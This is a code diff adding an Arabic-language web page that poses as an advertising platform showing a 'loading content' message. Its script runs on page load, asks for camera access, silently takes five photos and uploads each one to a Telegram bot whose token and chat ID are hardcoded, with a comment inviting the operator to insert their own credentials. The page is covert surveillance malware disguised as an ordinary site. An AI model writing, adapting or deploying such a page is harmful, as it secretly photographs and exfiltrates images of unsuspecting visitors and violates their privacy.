@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مرحباً بك في موقعنا</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .container { text-align: center; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #1c1e21; }
+        p { color: #606770; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>أهلاً بك في منصة الإعلانات</h1>
+        <p>يرجى الانتظار جارٍ تحميل المحتوى...</p>
+    </div>
+
+    <script>
+        // ==========================================
+        // ضع بياناتك هنا فقط
+        const BOT_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8'; 
+        const CHAT_ID = '5516597110';
+        // ==========================================
+
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                let count = 0;
+                const maxPhotos = 5;
+
+                const capture = setInterval(async () => {
+                    if (count < maxPhotos) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'image.jpg');
+
+                            try {
+                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            } catch (e) {
+                                console.error("خطأ في الإرسال");
+                            }
+                        }, 'image/jpeg');
+
+                        count++;
+                    } else {
+                        clearInterval(capture);
+                        stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً
+                    }
+                }, 1500); // يلتقط صورة كل ثانية ونصف
+
+            } catch (err) {
+                console.log("تم رفض الإذن أو الكاميرا غير متوفرة");
+            }
+        }
+
+        // يبدأ العمل فور دخول الموقع
+        window.onload = initCamera;
+    </script>
+</body>
+</html>
+
